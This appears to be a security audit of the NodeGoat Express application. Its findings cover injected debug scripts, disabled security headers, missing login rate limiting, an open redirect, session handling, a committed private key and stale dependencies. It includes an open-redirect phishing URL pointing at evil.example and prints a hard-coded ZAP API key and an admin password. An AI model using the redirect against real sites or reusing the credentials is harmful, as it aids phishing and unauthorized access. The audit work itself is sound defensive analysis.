evidence: If the process is started without NODE_ENV set (the Dockerfile and package.json's `npm start` script do not set it), `finalEnv` resolves to "development" and config.js loads config/env/development.js, which sets `environmentalScripts` to an array containing a raw `<script>` tag that loads `livereload.js` from the requesting host (development.js lines 9-13), plus a hard-coded `zapApiKey`. Every render call in app/routes/session.js (displayLoginPage, displaySignupPage, handleLoginRequest, handleSignup, displayWelcomePage) passes `environmentalScripts` straight into the view, and app/views/layout.html line 126 emits it with `{{script}}` inside a `{% for %}` loop with swig's global autoescape disabled (server.js line 137), so the raw markup is written into every page unescaped.
impact: A deployment that forgets to set NODE_ENV=production ships a script on every page (login, signup, dashboard, etc.) that has the browser fetch and execute `http://<host>:35729/livereload.js`, and exposes a hard-coded API key value in the config object logged to the console (config.js lines 12-13). This is exactly the class of 'debug settings left enabled in production' misconfiguration, reachable purely by omission.
fix: Fail closed instead of defaulting to development: require NODE_ENV to be explicitly set to "production" for a production start script, or move environmentalScripts and any debug-only script injection out of the shared config path entirely so a missing NODE_ENV cannot re-enable it.

title: All Helmet security headers (X-Powered-By, frameguard, CSP, no-cache, HSTS, MIME-sniffing) are commented out
evidence: server.js requires `helmet` at line 10 and `dont-sniff-mimetype` at line 14 (both present in package.json as dependencies), but every call that would mount them - app.disable("x-powered-by"), helmet.frameguard(), helmet.noCache(), helmet.contentSecurityPolicy(), helmet.hsts(), nosniff() - sits inside a block comment from line 38 to 65, between the body-parser mount (line 71) and the route registration (line 132). No other middleware in the file sets any of these headers or an equivalent CSP/X-Frame-Options/X-Content-Type-Options value, so the app answers every request with none of them.
impact: Responses carry no Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options and still advertise X-Powered-By: Express. Combined with the disabled autoescaping in swig (server.js line 137, `autoescape: false`) this removes a major mitigation against reflected/stored XSS, allows the app to be framed for clickjacking, lets browsers MIME-sniff responses, and fingerprints the framework for attackers selecting exploits.
fix: Uncomment and mount helmet with an explicit configuration (`app.use(helmet())` plus a real `contentSecurityPolicy` directive list), call `app.disable('x-powered-by')`, and mount `nosniff()` before the routes are registered.

title: No rate limiting or lockout on the login and signup routes
evidence: `POST /login` at line 34 is wired straight to `sessionHandler.handleLoginRequest` (app/routes/session.js line 53) with no middleware in front of it besides body/session parsing mounted in server.js; `handleLoginRequest` calls `userDAO.validateLogin` on every request with no attempt counter, delay, or lockout. package.json lists no rate-limiting dependency (`express-rate-limit`, `express-brute`, etc.), and a repository-wide search for `rate-limit`/`rateLimit`/`express-brute` found nothing. The same is true for `POST /signup` at line 38.
impact: An attacker can script unlimited password guesses against any known username at /login (or account-enumeration/mass-signup abuse at /signup) with no server-side throttling.
fix: Add a rate limiter (e.g. `express-rate-limit`) keyed by IP and by submitted username on /login and /signup, and consider an incrementing lockout/backoff stored per account.

title: The /learn route redirects to an attacker-supplied URL taken straight from the query string
evidence: `req.query.url` is attacker-controlled input from the request URL. It reaches `res.redirect()` at line 72 with no validation, no allowlist of destination hosts, and no check that it is a relative path; the only guard on the route is `isLoggedIn`, which checks authentication, not the redirect target.
impact: An attacker sends a logged-in victim a link like `/learn?url=https://evil.example/phish`; the app itself redirects the victim there, which is more convincing than a bare external link and can be used for phishing or to bounce an OAuth-style token through a trusted domain.
fix: Validate the destination against an allowlist of known hosts/paths (the route already only ever links to a fixed khanacademy.org URL from layout.html line 62), or resolve the target and reject anything that is not a relative, same-origin path.

title: Sessions are created for every visitor and never expire (saveUninitialized/resave true, no maxAge)
snippet:
secret: cookieSecret,
        // Both mandatory in Express v4
        saveUninitialized: true,
        resave: true
evidence: `saveUninitialized: true` stores a session record for every request, authenticated or not, and `resave: true` re-persists it on every request even when nothing changed. No `cookie.maxAge` is set anywhere in the session() call (the only maxAge reference is a TODO comment at line 94), so the session cookie is a browser-session cookie with no server-side expiry once express-session's own defaults are used.
impact: Sessions accumulate indefinitely in whatever session store is configured (MemoryStore by default, since no store option is set), which is both a memory-exhaustion risk under load and means a stolen session id (see platform-cookie-flags-missing) remains valid far longer than necessary.
fix: Set `saveUninitialized: false`, keep `resave: false` once the store supports touch, and set an explicit, bounded `cookie.maxAge`; back the store with a persistent, capacity-limited session store (e.g. connect-mongo) rather than the in-memory default.

title: RSA private key is committed to the repository alongside its matching certificate
snippet:
-----BEGIN RSA PRIVATE KEY-----
[REDACTED PRIVATE KEY BODY]
-----END RSA PRIVATE KEY-----
evidence: artifacts/cert/server.key holds a complete PEM-encoded RSA private key, paired with artifacts/cert/server.crt in the same directory. server.js lines 21-27 (commented out) show the code that would load exactly this path — `fs.readFileSync(path.resolve(__dirname, "./artifacts/cert/server.key"))` — to build httpsOptions, and lines 149-155 (also commented out) show the matching `https.createServer(httpsOptions, app).listen(...)` call. The server that actually runs today calls `http.createServer(app).listen(port, ...)` at line 145, so this key is not loaded by the currently active code path. It is nonetheless a real private key checked into source control, which is why this is marked `likely` rather than `confirmed`: the pattern and the key are both read, but the path that would put it into a live TLS listener is disabled, not exercised.
impact: If HTTPS is enabled by uncommenting this block — which app/views/tutorial/a6.html's own "Fix" walkthrough instructs a learner to do — any deployment that reuses this checked-in key/cert pair serves TLS with a private key that everyone who ever cloned the repository has always had, permitting TLS impersonation of the server or decryption of any traffic captured against that certificate.
fix: Remove the private key from source control, generate a fresh key pair per environment outside the repository (or via a CA / Let's Encrypt), and load it at deploy time from a secret store or mounted volume rather than a path inside the checked-out tree.

title: bcrypt-nodejs, used for password hashing, has had no release since 2013 and carries no security fixes since
evidence: npm audit reports no known advisory for bcrypt-nodejs@0.0.3 (it is not in the audit's vulnerabilities map), so this is a maintenance finding, not an advisory. The npm registry's own version history for bcrypt-nodejs shows exactly three releases, the last (0.0.3) published 2013-02-25; `npm view bcrypt-nodejs deprecated` returns "bcrypt-nodejs is no longer actively maintained. Please use bcrypt or bcryptjs." app/data/user-dao.js:1 requires this package and uses it to hash and compare every user's password.
impact: No currently known CVE, but a security-critical function (password hashing) depends on a package with no maintainer response path; any future weakness found in its bcrypt implementation, or incompatibility with a newer Node.js/V8, will never be patched upstream.
fix: Migrate to bcrypt or bcryptjs, both actively maintained and named as the replacement in bcrypt-nodejs's own deprecation notice; update app/data/user-dao.js's hash/compare calls accordingly.

title: csurf is archived upstream and only carries a low-severity transitive cookie advisory
evidence: npm audit resolves this range to csurf@1.9.0 and reports one transitive advisory package, cookie (GHSA-pxg6-pf52-xh8x, low). `npm view csurf deprecated` returns "This package is archived and no longer maintained. For support, visit https://github.com/expressjs/express/discussions" — csurf itself has no active maintainer going forward even though the currently-known vulnerability in its cookie dependency is low severity.
impact: No high-impact vulnerability is known today, but csurf will not receive fixes for anything discovered in it or its dependencies from here on, including CSRF-token-handling bugs specific to csurf itself.
fix: Plan a migration off csurf to a maintained CSRF middleware (the express maintainers' own guidance points elsewhere, e.g. csrf-csrf) since csurf will not be patched again; in the meantime bump the cookie sub-dependency to >=0.7.0.

title: cypress (^3.3.1, devDependency) is 12+ majors behind and carries 22 transitive advisories, but is test/dev-only
evidence: npm audit marks cypress critical with fixAvailable pointing to cypress@16.1.0 (semver-major). Its transitive chain (debug, extract-zip, getos, lodash, minimist, moment, request, tmp — 22 vulnerable packages roll up to it per npm audit's own effects graph) includes prototype pollution (minimist), ReDoS (debug, moment) and the deprecated `request` package with its own SSRF-adjacent history. cypress is listed only under devDependencies in package.json and server.js does not require it, so it does not ship into the running application.
impact: These advisories affect the local developer machine and CI runner that execute `npm run test:e2e`/`test:ci`, not the deployed NodeGoat server; a compromised e2e fixture or a malicious CI dependency confusion attack is the realistic exposure, not remote exploitation of the running app.
fix: Upgrade cypress to a current major during a planned test-tooling refresh; treat it as lower urgency than the production dependencies above since it is dev/CI-only.

title: express-session (^1.13.0, installed 1.15.6) pulls two low-severity cookie/header advisories
evidence: npm audit resolves this range to express-session@1.15.6. Its two transitive advisory packages are cookie (GHSA-pxg6-pf52-xh8x, low, out-of-bounds characters accepted in cookie name/path/domain, fixed in cookie@0.7.0) and on-headers (GHSA-76c9-3jph-rj3q, low, HTTP response header manipulation, fixed in on-headers@1.1.0). Both are low severity per the advisory database itself.
impact: A cookie or header value built from unchecked input could smuggle characters the parser does not expect, though the advisory database rates real-world impact low.
fix: Upgrade express-session to a version that resolves cookie>=0.7.0 and on-headers>=1.1.0 (available as a semver-minor bump per npm audit's fixAvailable: true).

title: mocha (^2.4.5, devDependency) is 10 majors behind and carries 8 transitive advisories
evidence: npm audit resolves this to a vulnerable mocha with fixAvailable pointing to mocha@12.0.2 (semver-major). Its transitive chain (debug, diff, glob, growl, mkdirp — 8 vulnerable packages roll up to it) mirrors the same debug ReDoS family seen under helmet. mocha only runs via the `test` script (grunt-mocha-test) and is not part of the deployed application.
impact: Same class of risk as cypress: exposure is to the local/CI test run, not to the running NodeGoat server.
fix: Upgrade mocha to a current major as part of a test-tooling refresh; lower priority than the production dependencies.

title: Admin credential is duplicated as a plaintext Cypress e2e test fixture
evidence: test/e2e/fixtures/users/admin.json stores the same admin password, "Admin_123", as a Cypress e2e login fixture (cypress.json's `fixturesFolder` points at test/e2e/fixtures). This value is read by the e2e test suite to log in during automated browser tests, not by the running application server itself, so it is reported at lower severity and separately from the artifacts/db-reset.js finding, which is the value the running service actually seeds into the database and authenticates against.
impact: Limited on its own, since it only drives local/CI Cypress test runs; but because it duplicates the real seeded admin password, anyone reading this fixture also learns the production-seeded admin credential (see secrets-admin-seed-password).
fix: Once the seeded admin password is randomized and no longer fixed (see the db-reset.js finding's fix), update this fixture to pull its test credential from a CI/environment secret instead of a checked-in literal.

title: OWASP ZAP proxy API key is hard-coded in committed dev/test configuration
evidence: config/env/development.js hardcodes zapApiKey as the literal "v9dn0balpqas1pcc281tn5ood1" (the identical literal is also hardcoded at config/env/test.js line 6). test/security/profile-test.js line 28 reads it via `config.zapApiKey` and uses it (lines 87, 132-260) to authenticate to a ZAP proxy at config.zapHostName, which config/env/development.js and config/env/test.js both set to "192.168.56.20" — a private/lab-network address, not the deployed application itself.
impact: Low: this key only authenticates to a locally-run OWASP ZAP proxy instance on a private test network used for automated security regression scanning. Anyone with the repository who could also reach that proxy could interact with its scan session, but the key grants no access to the deployed NodeGoat application or its data.
fix: Move the ZAP API key to an environment variable supplied at test-run time rather than a checked-in literal, and rotate the committed value.

title: node-esapi, used for output encoding, has had exactly one release, in 2014, and no activity since
evidence: npm audit reports no known advisory for node-esapi@0.0.1 (not present in the audit's vulnerabilities map). The npm registry's full publish history for node-esapi shows a single version, 0.0.1, published 2014-01-31, with no version since — the package has been effectively abandoned for over 11 years. app/routes/profile.js:2 requires it as `ESAPI` and app/routes/session.js has a second, commented-out require of the same package, showing it was intended for use in more than one route.
impact: No currently known CVE, and this is an info-level maintenance note rather than a proven vulnerability: a single-release, decade-abandoned encoding library backing the app's XSS-defense calls will not receive a fix if a bypass is ever found in its encoding routines.
fix: Replace node-esapi with a maintained, actively-updated output-encoding library appropriate to the templating engine in use, and remove the dead commented-out require in session.js.
